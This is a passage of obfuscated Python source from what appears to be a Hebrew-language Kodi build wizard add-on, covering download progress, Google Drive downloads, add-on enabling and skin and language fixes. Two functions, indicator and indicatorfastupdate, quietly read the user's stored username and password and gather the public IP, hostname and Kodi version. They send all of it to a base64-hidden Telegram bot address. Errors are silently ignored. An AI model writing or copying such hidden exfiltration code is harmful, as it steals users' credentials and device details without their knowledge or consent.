        OO0OO0OO000O0OO00 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0O00O00OOOO00OO0 ,'teal',O000OO0OO00O0OO00 )#line:3452
        if (time .time ()-OOO0OO0O00O000O0O )>0 :#line:3453
          O000OOOOO00O00O0O =O0000O0000O0000O0 /(time .time ()-OOO0OO0O00O000O0O )#line:3454
          O000OOOOO00O00O0O =O000OOOOO00O00O0O /1024 #line:3455
        else :#line:3456
         O000OOOOO00O00O0O =0 #line:3457
        OOOO0O0OOO000O00O ='KB'#line:3458
        if O000OOOOO00O00O0O >=1024 :#line:3459
           O000OOOOO00O00O0O =O000OOOOO00O00O0O /1024 #line:3460
           OOOO0O0OOO000O00O ='MB'#line:3461
        if O000OOOOO00O00O0O >0 and not O0OOO000O0OO0O000 ==100 :#line:3462
            O000OOO0O0O0OOO0O =(O0O0000O0O0000OO0 -O0000O0000O0000O0 )/O000OOOOO00O00O0O #line:3463
        else :#line:3464
            O000OOO0O0O0OOO0O =0 #line:3465
        O00O0OO0O00O00OO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O000OOOOO00O00O0O ,OOOO0O0OOO000O00O )#line:3466
        OOO0O0OOO0O00O00O .update (int (O0OOO000O0OO0O000 ),"Downloading "+name ,OO0OO0OO000O0OO00 ,O00O0OO0O00O00OO0 )#line:3468
  OOO000OO00O00OO00 =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3471
  OOOO000O0O000O00O .close ()#line:3473
  extract (O0OOOOO00OO00OO0O ,OOO000OO00O00OO00 ,OOO0O0OOO0O00O00O )#line:3475
  if os .path .exists (OOO000OO00O00OO00 +'/scakemyer-script.quasar.burst'):#line:3476
    if os .path .exists (OOO000OO00O00OO00 +'/script.quasar.burst'):#line:3477
     shutil .rmtree (OOO000OO00O00OO00 +'/script.quasar.burst',ignore_errors =False )#line:3478
    os .rename (OOO000OO00O00OO00 +'/scakemyer-script.quasar.burst',OOO000OO00O00OO00 +'/script.quasar.burst')#line:3479
  if os .path .exists (OOO000OO00O00OO00 +'/plugin.video.kmediatorrent-master'):#line:3481
    if os .path .exists (OOO000OO00O00OO00 +'/plugin.video.kmediatorrent'):#line:3482
     shutil .rmtree (OOO000OO00O00OO00 +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3483
    os .rename (OOO000OO00O00OO00 +'/plugin.video.kmediatorrent-master',OOO000OO00O00OO00 +'/plugin.video.kmediatorrent')#line:3484
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3485
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3486
  try :#line:3487
    os .remove (O0OOOOO00OO00OO0O )#line:3488
  except :#line:3489
    pass #line:3490
  OOO0O0OOO0O00O00O .close ()#line:3491
def dis_or_enable_addon (O00O0O0OO000O0OOO ,O0O0O000OOO000O0O ,enable ="true"):#line:3492
    import json #line:3493
    OO000OO0OOO0OOO0O ='"%s"'%O00O0O0OO000O0OOO #line:3494
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O00O0O0OO000O0OOO )and enable =="true":#line:3495
        logging .warning ('already Enabled')#line:3496
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O00O0O0OO000O0OOO )#line:3497
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O00O0O0OO000O0OOO )and enable =="false":#line:3498
        return xbmc .log ("### Skipped %s, reason = not installed"%O00O0O0OO000O0OOO )#line:3499
    else :#line:3500
        OOO0OO0O000OO0O00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OO000OO0OOO0OOO0O ,enable )#line:3501
        O00OO0OOO000OO00O =xbmc .executeJSONRPC (OOO0OO0O000OO0O00 )#line:3502
        O0O00O00OO0OOO0O0 =json .loads (O00OO0OOO000OO00O )#line:3503
        if enable =="true":#line:3504
            xbmc .log ("### Enabled %s, response = %s"%(O00O0O0OO000O0OOO ,O0O00O00OO0OOO0O0 ))#line:3505
        else :#line:3506
            xbmc .log ("### Disabled %s, response = %s"%(O00O0O0OO000O0OOO ,O0O00O00OO0OOO0O0 ))#line:3507
    if O0O0O000OOO000O0O =='auto':#line:3508
     return True #line:3509
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3510
def chunk_report (O00O0O000OO0O0O00 ,O0O0OOOO0O00O0OOO ,OOOOOOOO00O0O000O ):#line:3511
   OO0O0OO0OOO0O0OOO =float (O00O0O000OO0O0O00 )/OOOOOOOO00O0O000O #line:3512
   OO0O0OO0OOO0O0OOO =round (OO0O0OO0OOO0O0OOO *100 ,2 )#line:3513
   if O00O0O000OO0O0O00 >=OOOOOOOO00O0O000O :#line:3515
      sys .stdout .write ('\n')#line:3516
def chunk_read (O000O00OO0OOOO00O ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3518
   import time #line:3519
   O00OOO00OO0000O0O =int (filesize )*1000000 #line:3520
   OOO00OOO0O000OO0O =0 #line:3522
   OOO00O0O00OO0O00O =time .time ()#line:3523
   OO0OO000OO00OOO0O =0 #line:3524
   logging .warning ('Downloading')#line:3526
   with open (destination ,"wb")as O0OOOOO0O0O0O00O0 :#line:3527
    while 1 :#line:3528
      OOOOOO0OO000OOO0O =time .time ()-OOO00O0O00OO0O00O #line:3529
      O0000O00OO000OOO0 =int (OO0OO000OO00OOO0O *chunk_size )#line:3530
      O000000000O00OOOO =O000O00OO0OOOO00O .read (chunk_size )#line:3531
      O0OOOOO0O0O0O00O0 .write (O000000000O00OOOO )#line:3532
      O0OOOOO0O0O0O00O0 .flush ()#line:3533
      OOO00OOO0O000OO0O +=len (O000000000O00OOOO )#line:3534
      O000OO0O0O00OOO0O =float (OOO00OOO0O000OO0O )/O00OOO00OO0000O0O #line:3535
      O000OO0O0O00OOO0O =round (O000OO0O0O00OOO0O *100 ,2 )#line:3536
      if int (OOOOOO0OO000OOO0O )>0 :#line:3537
        OO0OO0O00OOOOOO00 =int (O0000O00OO000OOO0 /(1024 *OOOOOO0OO000OOO0O ))#line:3538
      else :#line:3539
         OO0OO0O00OOOOOO00 =0 #line:3540
      if OO0OO0O00OOOOOO00 >1024 and not O000OO0O0O00OOO0O ==100 :#line:3541
          O0O0O00OO0OO0000O =int (((O00OOO00OO0000O0O -O0000O00OO000OOO0 )/1024 )/(OO0OO0O00OOOOOO00 ))#line:3542
      else :#line:3543
          O0O0O00OO0OO0000O =0 #line:3544
      if O0O0O00OO0OO0000O <0 :#line:3545
        O0O0O00OO0OO0000O =0 #line:3546
      dp .update (int (O000OO0O0O00OOO0O ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O000OO0O0O00OOO0O ,O0000O00OO000OOO0 /(1024 *1024 ),O00OOO00OO0000O0O /(1000 *1000 ),OO0OO0O00OOOOOO00 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O0O0O00OO0OO0000O ,60 ))#line:3547
      if dp .iscanceled ():#line:3548
         dp .close ()#line:3549
         break #line:3550
      if not O000000000O00OOOO :#line:3551
         break #line:3552
      if report_hook :#line:3554
         report_hook (OOO00OOO0O000OO0O ,chunk_size ,O00OOO00OO0000O0O )#line:3555
      OO0OO000OO00OOO0O +=1 #line:3556
   logging .warning ('END Downloading')#line:3557
   return OOO00OOO0O000OO0O #line:3558
def googledrive_download (O0OOOO0O0O0O0OOO0 ,OO0OO0O0OO0OOO0OO ,OO00OO0O0O0O0OO00 ,O00O00OO0O00OO0O0 ):#line:3560
    O0O000O0O00O0OO00 =[]#line:3564
    O00O0OOO0000O0000 =O0OOOO0O0O0O0OOO0 .split ('=')#line:3565
    O0OOOO0O0O0O0OOO0 =O00O0OOO0000O0000 [len (O00O0OOO0000O0000 )-1 ]#line:3566
    def OO0OOOOOO00OOOO00 (OOO0000000OOOO000 ):#line:3568
        for OO000O0OO0OOO0O0O in OOO0000000OOOO000 :#line:3570
            logging .warning ('cookie.name')#line:3571
            logging .warning (OO000O0OO0OOO0O0O .name )#line:3572
            OOO0O0OO0000OOOOO =OO000O0OO0OOO0O0O .value #line:3573
            if 'download_warning'in OO000O0OO0OOO0O0O .name :#line:3574
                logging .warning (OO000O0OO0OOO0O0O .value )#line:3575
                logging .warning ('cookie.value')#line:3576
                return OO000O0OO0OOO0O0O .value #line:3577
            return OOO0O0OO0000OOOOO #line:3578
        return None #line:3580
    def O0OOOOOO0OO000000 (OO0O0O0O0O0O00O00 ,O0O0O0OO0OOOOO000 ):#line:3582
        O0OOO0O0OOO0O00O0 =32768 #line:3584
        OO0OOO0OO0OOOOOO0 =time .time ()#line:3585
        with open (O0O0O0OO0OOOOO000 ,"wb")as OOOO0OOO000OOOOO0 :#line:3587
            OO00O000OO0O0OOO0 =1 #line:3588
            O0O0OO000O0OO0OOO =32768 #line:3589
            try :#line:3590
                OO00OOO0OOO0O0O0O =int (OO0O0O0O0O0O00O00 .headers .get ('content-length'))#line:3591
                print ('file total size :',OO00OOO0OOO0O0O0O )#line:3592
            except TypeError :#line:3593
                print ('using dummy length !!!')#line:3594
                OO00OOO0OOO0O0O0O =int (O00O00OO0O00OO0O0 )*1000000 #line:3595
            for OO000OO0OOOOO000O in OO0O0O0O0O0O00O00 .iter_content (O0OOO0O0OOO0O00O0 ):#line:3596
                if OO000OO0OOOOO000O :#line:3597
                    OOOO0OOO000OOOOO0 .write (OO000OO0OOOOO000O )#line:3598
                    OOOO0OOO000OOOOO0 .flush ()#line:3599
                    OOO00O0O00O00OOO0 =time .time ()-OO0OOO0OO0OOOOOO0 #line:3600
                    OOO0OOOO00OO0O000 =int (OO00O000OO0O0OOO0 *O0O0OO000O0OO0OOO )#line:3601
                    if OOO00O0O00O00OOO0 ==0 :#line:3602
                        OOO00O0O00O00OOO0 =0.1 #line:3603
                    OO0O00OOOO0O0OOOO =int (OOO0OOOO00OO0O000 /(1024 *OOO00O0O00O00OOO0 ))#line:3604
                    OO00OOO0O0OO00O00 =int (OO00O000OO0O0OOO0 *O0O0OO000O0OO0OOO *100 /OO00OOO0OOO0O0O0O )#line:3605
                    if OO0O00OOOO0O0OOOO >1024 and not OO00OOO0O0OO00O00 ==100 :#line:3606
                      O0OO00OOO0000O000 =int (((OO00OOO0OOO0O0O0O -OOO0OOOO00OO0O000 )/1024 )/(OO0O00OOOO0O0OOOO ))#line:3607
                    else :#line:3608
                      O0OO00OOO0000O000 =0 #line:3609
                    OO00OO0O0O0O0OO00 .update (int (OO00OOO0O0OO00O00 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OO00OOO0O0OO00O00 ,OOO0OOOO00OO0O000 /(1024 *1024 ),OO00OOO0OOO0O0O0O /(1000 *1000 ),OO0O00OOOO0O0OOOO ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O0OO00OOO0000O000 ,60 ))#line:3611
                    OO00O000OO0O0OOO0 +=1 #line:3612
                    if OO00OO0O0O0O0OO00 .iscanceled ():#line:3613
                     OO00OO0O0O0O0OO00 .close ()#line:3614
                     break #line:3615
    O0O00O00000O00O00 ="https://docs.google.com/uc?export=download"#line:3616
    import urllib2 #line:3621
    import cookielib #line:3622
    from cookielib import CookieJar #line:3624
    OO0O00000OOOOO000 =CookieJar ()#line:3626
    OOO000OO000OO0O00 =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (OO0O00000OOOOO000 ))#line:3627
    OOOOO0OO0OO0OO0O0 ={'id':O0OOOO0O0O0O0OOO0 }#line:3629
    O0000OOOOOO0OOOOO =urllib .urlencode (OOOOO0OO0OO0OO0O0 )#line:3630
    logging .warning (O0O00O00000O00O00 +'&'+O0000OOOOOO0OOOOO )#line:3631
    O000O0O0000O00OO0 =OOO000OO000OO0O00 .open (O0O00O00000O00O00 +'&'+O0000OOOOOO0OOOOO )#line:3632
    O0O00O0OOOO0OO000 =O000O0O0000O00OO0 .read ()#line:3633
    for OO0O0OOO000OO0O00 in OO0O00000OOOOO000 :#line:3635
         logging .warning (OO0O0OOO000OO0O00 )#line:3636
    OO0O00OOO0O00O000 =OO0OOOOOO00OOOO00 (OO0O00000OOOOO000 )#line:3637
    logging .warning (OO0O00OOO0O00O000 )#line:3638
    if OO0O00OOO0O00O000 :#line:3639
        OOOOOOOO0O00000O0 ={'id':O0OOOO0O0O0O0OOO0 ,'confirm':OO0O00OOO0O00O000 }#line:3640
        OO000000O0O0O0000 ={'Access-Control-Allow-Headers':'Content-Length'}#line:3641
        O0000OOOOOO0OOOOO =urllib .urlencode (OOOOOOOO0O00000O0 )#line:3642
        O000O0O0000O00OO0 =OOO000OO000OO0O00 .open (O0O00O00000O00O00 +'&'+O0000OOOOOO0OOOOO )#line:3643
        chunk_read (O000O0O0000O00OO0 ,report_hook =chunk_report ,dp =OO00OO0O0O0O0OO00 ,destination =OO0OO0O0OO0OOO0OO ,filesize =O00O00OO0O00OO0O0 )#line:3644
    return (O0O000O0O00O0OO00 )#line:3648
def kodi17Fix ():#line:3649
	O0OOO00OO0OO0O00O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3650
	OOO000OO0OOO00OOO =[]#line:3651
	for O00O00O000OOOO00O in sorted (O0OOO00OO0OO0O00O ,key =lambda OO0OOOOOO00OO00OO :OO0OOOOOO00OO00OO ):#line:3652
		OO0000O0O0O0O0OO0 =os .path .join (O00O00O000OOOO00O ,'addon.xml')#line:3653
		if os .path .exists (OO0000O0O0O0O0OO0 ):#line:3654
			OOO0OOOO00O0OO00O =O00O00O000OOOO00O .replace (ADDONS ,'')[1 :-1 ]#line:3655
			OO000O00000OO0OO0 =open (OO0000O0O0O0O0OO0 )#line:3656
			OOO0000OO0OO00OO0 =OO000O00000OO0OO0 .read ()#line:3657
			O0O0OOO0O00O0O000 =parseDOM (OOO0000OO0OO00OO0 ,'addon',ret ='id')#line:3658
			OO000O00000OO0OO0 .close ()#line:3659
			try :#line:3660
				OO0OOOO0O000O00OO =xbmcaddon .Addon (id =O0O0OOO0O00O0O000 [0 ])#line:3661
			except :#line:3662
				try :#line:3663
					log ("%s was disabled"%O0O0OOO0O00O0O000 [0 ],xbmc .LOGDEBUG )#line:3664
					OOO000OO0OOO00OOO .append (O0O0OOO0O00O0O000 [0 ])#line:3665
				except :#line:3666
					try :#line:3667
						log ("%s was disabled"%OOO0OOOO00O0OO00O ,xbmc .LOGDEBUG )#line:3668
						OOO000OO0OOO00OOO .append (OOO0OOOO00O0OO00O )#line:3669
					except :#line:3670
						if len (O0O0OOO0O00O0O000 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%OOO0OOOO00O0OO00O ,xbmc .LOGERROR )#line:3671
						else :log ("Unabled to enable: %s"%O00O00O000OOOO00O ,xbmc .LOGERROR )#line:3672
	if len (OOO000OO0OOO00OOO )>0 :#line:3673
		OOO0OO0O0OO0OO00O =0 #line:3674
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3675
		for O0OOO00O00000000O in OOO000OO0OOO00OOO :#line:3676
			OOO0OO0O0OO0OO00O +=1 #line:3677
			OOOO0000O0000OOOO =int (percentage (OOO0OO0O0OO0OO00O ,len (OOO000OO0OOO00OOO )))#line:3678
			DP .update (OOOO0000O0000OOOO ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOO00O00000000O ))#line:3679
			addonDatabase (O0OOO00O00000000O ,1 )#line:3680
			if DP .iscanceled ():break #line:3681
		if DP .iscanceled ():#line:3682
			DP .close ()#line:3683
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3684
			sys .exit ()#line:3685
		DP .close ()#line:3686
	forceUpdate ()#line:3687
def indicator ():#line:3689
       try :#line:3690
          import json #line:3691
          wiz .log ('FRESH MESSAGE')#line:3692
          OOO0000000OOOO00O =(ADDON .getSetting ("user"))#line:3693
          OOO0OOOOO00O0OOO0 =(ADDON .getSetting ("pass"))#line:3694
          O00OO0OO0OO0000O0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3695
          OOO0O0O00OOO0O0O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3696
          OO00OO000OO000O00 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3697
          OOOO00OOO0O00OOOO =str (json .loads (OO00OO000OO000O00 )['ip'])#line:3698
          OOOOO00O0OOOOOOOO =OOO0000000OOOO00O #line:3699
          O0O00OOO00O00O0OO =OOO0OOOOO00O0OOO0 #line:3700
          import socket #line:3701
          OO00OO000OO000O00 =urllib2 .urlopen (OOO0O0O00OOO0O0O0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OOOOO00O0OOOOOOOO +' - '+O0O00OOO00O00O0OO +' - '+O00OO0OO0OO0000O0 +' - '+OOOO00OOO0O00OOOO ).readlines ()#line:3702
       except :pass #line:3704
def indicatorfastupdate ():#line:3706
       try :#line:3707
          import json #line:3708
          wiz .log ('FRESH MESSAGE')#line:3709
          O00O00OOO0O0000OO =(ADDON .getSetting ("user"))#line:3710
          O0000O00OOO0000O0 =(ADDON .getSetting ("pass"))#line:3711
          O0000OO00O0000O0O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3712
          OO00O0O0OO0OO0OOO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3714
          O0OO00OOOOOOOOOO0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3715
          OO0000000O0O0O000 =str (json .loads (O0OO00OOOOOOOOOO0 )['ip'])#line:3716
          OO00OO0O0O0O00O00 =O00O00OOO0O0000OO #line:3717
          O0O00OO0OOOO0OO00 =O0000O00OOO0000O0 #line:3718
          import socket #line:3720
          O0OO00OOOOOOOOOO0 =urllib2 .urlopen (OO00O0O0OO0OO0OOO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OO00OO0O0O0O00O00 +' - '+O0O00OO0OOOO0OO00 +' - '+O0000OO00O0000O0O +' - '+OO0000000O0O0O000 ).readlines ()#line:3721
       except :pass #line:3723
def skinfix18 ():#line:3725
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3726
		OO0O0OOOOOOOO00OO =wiz .workingURL (SKINID18DDONXML )#line:3727
		if OO0O0OOOOOOOO00OO ==True :#line:3728
			O00000O00OOOOOO0O =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3729
			if len (O00000O00OOOOOO0O )>0 :#line:3730
				OOOO000OOOOO0O000 ='%s-%s.zip'%(SKINID18 ,O00000O00OOOOOO0O [0 ])#line:3731
				OO0O0000OO0OO0OOO =wiz .workingURL (SKIN18ZIPURL +OOOO000OOOOO0O000 )#line:3732
				if OO0O0000OO0OO0OOO ==True :#line:3733
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3734
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3735
					O00OOO0000000O000 =os .path .join (PACKAGES ,OOOO000OOOOO0O000 )#line:3736
					try :os .remove (O00OOO0000000O000 )#line:3737
					except :pass #line:3738
					downloader .download (SKIN18ZIPURL +OOOO000OOOOO0O000 ,O00OOO0000000O000 ,DP )#line:3739
					extract .all (O00OOO0000000O000 ,HOME ,DP )#line:3740
					try :#line:3741
						O000OOOOO00O0OOO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3742
						OOO0OO0O0OOO00000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3743
						os .rename (O000OOOOO00O0OOO0 ,OOO0OO0O0OOO00000 )#line:3744
					except :#line:3745
						pass #line:3746
					try :#line:3747
						OOOO0000OOOOO0000 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');O00OO0OOOOO0O000O =OOOO0000OOOOO0000 .read ();OOOO0000OOOOO0000 .close ()#line:3748
						O0O0O0O0O0O00O000 =wiz .parseDOM (O00OO0OOOOO0O000O ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3749
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0O0O0O0O00O000 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3750
					except :#line:3751
						pass #line:3752
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3753
					DP .close ()#line:3754
					xbmc .sleep (500 )#line:3755
					wiz .forceUpdate (True )#line:3756
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3757
				else :#line:3758
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3759
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OO0O0000OO0OO0OOO ,xbmc .LOGERROR )#line:3760
			else :#line:3761
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3762
		else :#line:3763
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3764
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3765
def skinfix17 ():#line:3766
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3767
		O0000O0OOO0OOOO0O =wiz .workingURL (SKINID17DDONXML )#line:3768
		if O0000O0OOO0OOOO0O ==True :#line:3769
			OO0OOO0OO000OOO00 =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3770
			if len (OO0OOO0OO000OOO00 )>0 :#line:3771
				O000OOO0O0OO000OO ='%s-%s.zip'%(SKINID17 ,OO0OOO0OO000OOO00 [0 ])#line:3772
				OO0OOO0O0O0O0000O =wiz .workingURL (SKIN17ZIPURL +O000OOO0O0OO000OO )#line:3773
				if OO0OOO0O0O0O0000O ==True :#line:3774
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3775
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3776
					O00O000OO0O0OOOOO =os .path .join (PACKAGES ,O000OOO0O0OO000OO )#line:3777
					try :os .remove (O00O000OO0O0OOOOO )#line:3778
					except :pass #line:3779
					downloader .download (SKIN17ZIPURL +O000OOO0O0OO000OO ,O00O000OO0O0OOOOO ,DP )#line:3780
					extract .all (O00O000OO0O0OOOOO ,HOME ,DP )#line:3781
					try :#line:3782
						OO0OO00O0000O0O00 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3783
						O00OOO000000O0OOO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3784
						os .rename (OO0OO00O0000O0O00 ,O00OOO000000O0OOO )#line:3785
					except :#line:3786
						pass #line:3787
					try :#line:3788
						OO0O0000OOO0O0OO0 =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');OO0000000OOO0O0O0 =OO0O0000OOO0O0OO0 .read ();OO0O0000OOO0O0OO0 .close ()#line:3789
						O00000OOOO0O0OOOO =wiz .parseDOM (OO0000000OOO0O0O0 ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3790
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00000OOOO0O0OOOO [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3791
					except :#line:3792
						pass #line:3793
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3794
					DP .close ()#line:3795
					xbmc .sleep (500 )#line:3796
					wiz .forceUpdate (True )#line:3797
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3798
				else :#line:3799
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3800
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OO0OOO0O0O0O0000O ,xbmc .LOGERROR )#line:3801
			else :#line:3802
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3803
		else :#line:3804
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3805
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3806
def fix17update ():#line:3807
	if KODIV >=17 and KODIV <18 :#line:3808
		wiz .kodi17Fix ()#line:3809
		xbmc .sleep (4000 )#line:3810
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3811
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3812
		fixfont ()#line:3813
		O000OOOO0O0OOOO00 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3814
		try :#line:3816
			OOOOO0OOOOO0O00O0 =open (O000OOOO0O0OOOO00 ,'r')#line:3817
			OO00O00OO0OO00OO0 =OOOOO0OOOOO0O00O0 .read ()#line:3818
			OOOOO0OOOOO0O00O0 .close ()#line:3819
			O00O000000O00OOO0 ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3820
			O0O00OO000OO00O0O =re .compile (O00O000000O00OOO0 ).findall (OO00O00OO0OO00OO0 )[0 ]#line:3821
			OOOOO0OOOOO0O00O0 =open (O000OOOO0O0OOOO00 ,'w')#line:3822
			OOOOO0OOOOO0O00O0 .write (OO00O00OO0OO00OO0 .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%O0O00OO000OO00O0O ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3823
			OOOOO0OOOOO0O00O0 .close ()#line:3824
		except :#line:3825
				pass #line:3826
		wiz .kodi17Fix ()#line:3827
		O000OOOO0O0OOOO00 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3828
		try :#line:3829
			OOOOO0OOOOO0O00O0 =open (O000OOOO0O0OOOO00 ,'r')#line:3830
			OO00O00OO0OO00OO0 =OOOOO0OOOOO0O00O0 .read ()#line:3831
			OOOOO0OOOOO0O00O0 .close ()#line:3832
			O00O000000O00OOO0 ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3833
			O0O00OO000OO00O0O =re .compile (O00O000000O00OOO0 ).findall (OO00O00OO0OO00OO0 )[0 ]#line:3834
			OOOOO0OOOOO0O00O0 =open (O000OOOO0O0OOOO00 ,'w')#line:3835
			OOOOO0OOOOO0O00O0 .write (OO00O00OO0OO00OO0 .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%O0O00OO000OO00O0O ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3836
			OOOOO0OOOOO0O00O0 .close ()#line:3837
		except :#line:3838
				pass #line:3839
		swapSkins ('skin.Premium.mod')#line:3840
def fix18update ():#line:3842
	if KODIV >=18 :#line:3843
		xbmc .sleep (4000 )#line:3844
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3845
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3846
		fixfont ()#line:3847
		O0O000OO0OO00OO0O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3848
		try :#line:3849
			O0OO0O00O0OOO000O =open (O0O000OO0OO00OO0O ,'r')#line:3850
			OOOO0O0O0000O000O =O0OO0O00O0OOO000O .read ()#line:3851
			O0OO0O00O0OOO000O .close ()#line:3852
			O00OO0O00OO000O00 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3853
			OOO000O00O0O0O000 =re .compile (O00OO0O00OO000O00 ).findall (OOOO0O0O0000O000O )[0 ]#line:3854
			O0OO0O00O0OOO000O =open (O0O000OO0OO00OO0O ,'w')#line:3855
			O0OO0O00O0OOO000O .write (OOOO0O0O0000O000O .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%OOO000O00O0O0O000 ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3856
